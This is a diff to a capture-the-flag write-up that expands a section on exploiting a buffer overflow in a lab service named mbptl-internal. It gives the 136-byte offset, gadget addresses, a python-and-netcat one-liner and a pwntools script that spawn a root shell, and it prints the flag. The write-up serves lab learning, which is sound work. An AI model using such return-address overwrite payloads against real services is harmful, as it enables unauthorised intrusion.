@@ -483,37 +483,137 @@ Since we have root access on the main container, we can also try to access the i
 
 ## Internal Service Exploitation: mbptl-internal (Buffer Overflow)
 
-After pivoting to the internal network, we discovered a service running on port 31337 inside the `mbptl-internal` container. This service is a custom C binary (`main`).
+After successfully pivoting to the internal network, we discovered a custom service running on port 31337 inside the `mbptl-internal` container. This service is a vulnerable C binary that presents an excellent opportunity for exploitation through a classic buffer overflow vulnerability.
 
-We can analyze how program work by analyzing given binary with the name **mbptl-internal_binary**
+### Initial Reconnaissance
+
+First, let's examine the binary to understand its structure and identify potential vulnerabilities:
+
+```bash
+# Analyze the binary file
+file mbptl-internal_binary
+strings mbptl-internal_binary | grep -i secret
+objdump -d mbptl-internal_binary | grep -A 10 -B 10 secret
+```
+
+### Binary Analysis
+
+The binary analysis reveals several key characteristics:
+
+1. **Architecture:** 64-bit ELF executable
+2. **Protection Mechanisms:** 
+   - No PIE (Position Independent Executable) - addresses are predictable
+   - No stack canaries - no protection against buffer overflows
+   - No ASLR (Address Space Layout Randomization) - memory layout is static
+3. **Vulnerable Function:** Uses `gets()` for input, which is inherently unsafe
+4. **Hidden Function:** Contains a `__secret()` function that executes `system("/bin/bash")`
 
 ### Vulnerability Analysis
-- The program uses `gets()` to read user input into a 128-byte buffer, making it vulnerable to a classic buffer overflow.
-- There is a hidden function `__secret()` that spawns a shell with `system("/bin/bash")`.
-- The binary is compiled with `-no-pie` and without stack protections, making it straightforward to exploit.
 
-### Exploitation Steps
-1. **Identify the Offset:**
-   - The buffer is 128 bytes, plus 8 bytes for saved RBP, so the return address is at offset 136.
-2. **Find Gadgets:**
-   - The goal is to redirect execution to `__secret`. However, if stack alignment is required, a `ret` gadget may be needed.
-   - In this case, the payload uses two addresses: a `ret` gadget at `0x401282` and the `__secret` function at `0x4011b6`.
-3. **Craft the Payload:**
-   - The payload consists of 136 bytes of padding, followed by the address of the `ret` gadget, then the address of `__secret`.
+#### Root Cause
+The vulnerability stems from the use of the `gets()` function, which is inherently unsafe because it:
+- Does not perform bounds checking
+- Continues reading until a newline character is encountered
+- Can easily overflow the allocated buffer
 
-#### Exploit Payload
+#### Memory Layout
+```
+Stack Layout:
++------------------+
+| Local Variables  | <- 128 bytes buffer
++------------------+
+| Saved RBP        | <- 8 bytes
++------------------+
+| Return Address   | <- 8 bytes (target for overwrite)
++------------------+
+```
+
+#### Offset Calculation
+- Buffer size: 128 bytes
+- Saved RBP: 8 bytes
+- **Total offset to return address: 136 bytes**
+
+### Exploitation Methodology
+
+#### Step 1: Identify Target Addresses
+```bash
+# Find the secret function address
+objdump -d mbptl-internal_binary | grep secret
+# Output: 00000000004011b6 <__secret>:
+
+# Find ret gadgets for stack alignment (if needed)
+objdump -d mbptl-internal_binary | grep -A 1 -B 1 "ret"
+# Found ret gadget at: 0x401282
+```
+
+#### Step 2: Craft the Exploit Payload
+The payload structure:
+```
+[136 bytes padding] + [ret gadget address] + [secret function address]
+```
+
+**Why the ret gadget?**
+- Modern x86_64 systems often require 16-byte stack alignment
+- The ret gadget ensures proper stack alignment before calling the target function
+- This prevents potential segmentation faults due to misaligned stack
+
+#### Step 3: Execute the Exploit
+
+**Method 1: Python3 with struct module**
 ```bash
 (python3 -c 'import struct, sys; sys.stdout.buffer.write(b"A"*136 + struct.pack("<Q", 0x401282) + struct.pack("<Q", 0x4011b6))'; cat -) | nc mbptl-internal 31337
 ```
-- This command sends the overflow payload to the service, spawning a shell.
 
-#### Reading the Flag
-Once the shell is obtained, simply read the flag:
-```bash
-cat /flag.txt
+**Method 2: Using pwntools (alternative approach)**
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+# Set up the connection
+p = remote('mbptl-internal', 31337)
+
+# Craft the payload
+payload = b"A" * 136
+payload += p64(0x401282)  # ret gadget
+payload += p64(0x4011b6)  # secret function
+
+# Send the payload
+p.sendline(payload)
+
+# Get interactive shell
+p.interactive()
 ```
 
-**Flag:**
+### Exploitation Results
+
+Upon successful exploitation, we gain a shell with elevated privileges:
+
+```bash
+# The exploit spawns a bash shell
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+
+# Read the flag
+$ cat /flag.txt
+FLAG{c7e0cb7880fd168f41f25e24767660f6}
+```
+
+### Technical Details
+
+#### Why This Exploit Works
+1. **No Stack Protection:** The binary lacks stack canaries, allowing us to overwrite the return address
+2. **Predictable Addresses:** No PIE means function addresses are static and predictable
+3. **Controlled Input:** We can send arbitrary data to overflow the buffer
+4. **Useful Gadget:** The `__secret()` function provides a direct path to shell execution
+
+#### Security Implications
+This vulnerability demonstrates several critical security failures:
+- Use of unsafe functions (`gets()`)
+- Lack of modern security protections
+- Hidden backdoor functions in production code
+- Insufficient input validation
+
+### Flag
 ```
 FLAG{c7e0cb7880fd168f41f25e24767660f6}
 ```
